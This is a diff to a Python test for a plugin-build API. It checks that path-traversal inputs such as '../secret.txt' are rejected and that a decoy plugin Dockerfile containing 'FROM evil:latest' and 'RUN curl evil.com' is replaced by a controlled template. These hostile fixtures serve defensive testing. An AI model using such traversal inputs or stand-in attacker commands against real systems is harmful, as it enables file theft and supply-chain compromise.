@@ -223,31 +223,30 @@ def test_healthz_and_readyz(tmp_path: Path) -> None:
 def test_build_plugin_uses_controlled_template_and_declared_requirements(tmp_path: Path) -> None:
     client, fake_docker, settings = _make_client(tmp_path)
 
-    # Path traversal rejected
+    # Path traversal rejected on source_rel
     resp_bad = client.post(
         "/v1/plugins/build",
         json={"plugin_id": "acme.algo", "version": "1.0.0", "source_rel": "../escape"},
     )
     assert resp_bad.status_code == 400
 
-    # Valid plugin source with decoy Dockerfile and declared runtime.requirements path
+    # Valid plugin source with decoy Dockerfile and relative requirements path containing spaces
     src_dir = settings.plugin_source_root / "acme.algo" / "1.0.0"
-    (src_dir / "deps").mkdir(parents=True)
-    (src_dir / "plugin.yaml").write_text(
-        "schema: ies.algorithm-plugin\n"
-        "runtime:\n"
-        "  language: python\n"
-        "  python: '3.12'\n"
-        "  requirements: deps/requirements.txt\n",
-        encoding="utf-8",
-    )
+    (src_dir / "my deps").mkdir(parents=True)
+    (src_dir / "plugin.yaml").write_text("schema: ies.algorithm-plugin\n", encoding="utf-8")
     (src_dir / "main.py").write_text("def solve(ctx): pass\n", encoding="utf-8")
-    (src_dir / "deps" / "requirements.txt").write_text("numpy>=1.26\n", encoding="utf-8")
+    (src_dir / "my deps" / "requirements.txt").write_text("numpy>=1.26\n", encoding="utf-8")
     (src_dir / "Dockerfile").write_text("FROM evil:latest\nRUN curl evil.com\n", encoding="utf-8")
 
+    req_rel = "my deps/requirements.txt"
     resp_ok = client.post(
         "/v1/plugins/build",
-        json={"plugin_id": "acme.algo", "version": "1.0.0", "source_rel": "acme.algo/1.0.0"},
+        json={
+            "plugin_id": "acme.algo",
+            "version": "1.0.0",
+            "source_rel": "acme.algo/1.0.0",
+            "requirements_rel": req_rel,
+        },
     )
     assert resp_ok.status_code == 200
     body = resp_ok.json()
@@ -263,22 +262,24 @@ def test_build_plugin_uses_controlled_template_and_declared_requirements(tmp_pat
             base_image="pies-plugin-base:latest",
             plugin_id="acme.algo",
             version="1.0.0",
-            requirements_rel="deps/requirements.txt",
+            requirements_rel=req_rel,
             runtime_user="10001:10001",
         )
         assert "USER root" in df_text
         assert "USER 10001:10001" in df_text
         assert "FROM evil:latest" not in df_text
-        assert "COPY deps/requirements.txt /plugin/deps/requirements.txt" in df_text
+        assert 'COPY ["my deps/requirements.txt", "/plugin/my deps/requirements.txt"]' in df_text
+        assert 'RUN ["pip", "install", "--no-cache-dir", "-r", "/plugin/my deps/requirements.txt"]' in df_text
 
-    # Escaping runtime.requirements in plugin.yaml is rejected
-    (src_dir / "plugin.yaml").write_text(
-        "schema: ies.algorithm-plugin\nruntime:\n  requirements: ../secret.txt\n",
-        encoding="utf-8",
-    )
+    # Escaping requirements_rel is rejected
     resp_escape = client.post(
         "/v1/plugins/build",
-        json={"plugin_id": "acme.algo", "version": "1.0.0", "source_rel": "acme.algo/1.0.0"},
+        json={
+            "plugin_id": "acme.algo",
+            "version": "1.0.0",
+            "source_rel": "acme.algo/1.0.0",
+            "requirements_rel": "../secret.txt",
+        },
     )
     assert resp_escape.status_code == 400
 
